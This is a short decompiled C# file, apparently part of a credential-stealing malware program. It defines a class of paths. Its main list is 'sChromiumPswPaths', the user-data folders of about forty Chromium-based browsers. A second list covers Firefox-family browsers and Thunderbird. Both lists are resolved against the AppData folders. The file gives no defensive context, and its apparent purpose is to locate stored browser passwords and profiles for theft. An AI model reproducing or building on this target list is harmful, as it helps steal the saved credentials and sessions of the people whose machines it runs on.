﻿using System;

namespace SHARP
{
	// Token: 0x0200004B RID: 75
	internal sealed class Paths
	{
		// Token: 0x040000E1 RID: 225
		public static string[] sChromiumPswPaths = new string[]
		{
			"\\Yandex\\YandexBrowser\\User Data\\",
			"\\Yandex\\YandexBrowser\\User Data\\Default\\",
			"\\Chromium\\User Data\\",
			"\\Google\\Chrome\\User Data\\Default",
			"\\Google\\Chrome\\User Data\\",
			"\\Opera Software\\Opera Stable\\Default\\",
			"\\Opera Software\\Opera GX Stable\\",
			"\\Google(x86)\\Chrome\\User Data\\",
			"\\Opera Software\\Opera Stable\\Default",
			"\\MapleStudio\\ChromePlus\\User Data\\",
			"\\Iridium\\User Data\\",
			"\\7Star\\7Star\\User Data\\",
			"\\CentBrowser\\User Data\\",
			"\\Chedot\\User Data\\",
			"\\Vivaldi\\User Data\\",
			"\\Kometa\\User Data\\",
			"\\Elements Browser\\User Data\\",
			"\\Epic Privacy Browser\\User Data\\",
			"\\uCozMedia\\Uran\\User Data\\",
			"\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\",
			"\\CatalinaGroup\\Citrio\\User Data\\",
			"\\Coowon\\Coowon\\User Data\\",
			"\\liebao\\User Data\\",
			"\\QIP Surf\\User Data\\",
			"\\Orbitum\\User Data\\",
			"\\Comodo\\Dragon\\User Data\\",
			"\\Amigo\\User\\User Data\\",
			"\\Maxthon3\\User Data\\",
			"\\K-Melon\\User Data\\",
			"\\Torch\\User Data\\",
			"\\Comodo\\User Data\\",
			"\\360Browser\\Browser\\User Data\\",
			"\\Sputnik\\Sputnik\\User Data\\",
			"\\Nichrome\\User Data\\",
			"\\CocCoc\\Browser\\User Data\\",
			"\\Uran\\User Data\\",
			"\\Chromodo\\User Data\\",
			"\\Mail.Ru\\Atom\\User Data\\",
			"\\BraveSoftware\\Brave-Browser\\User Data\\",
			"\\Microsoft\\Edge\\User Data\\",
			"\\Microsoft\\Edge\\User Data\\Default\\"
		};

		// Token: 0x040000E2 RID: 226
		public static string[] sGeckoBrowserPaths = new string[]
		{
			"\\Mozilla\\Firefox",
			"\\Waterfox",
			"\\K-Meleon",
			"\\Thunderbird",
			"\\Comodo\\IceDragon",
			"\\8pecxstudios\\Cyberfox",
			"\\NETGATE Technologies\\BlackHaw",
			"\\Moonchild Productions\\Pale Moon"
		};

		// Token: 0x040000E3 RID: 227
		public static string EdgePath = "\\Microsoft\\Edge\\User Data";

		// Token: 0x040000E4 RID: 228
		public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x040000E5 RID: 229
		public static string lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	}
}
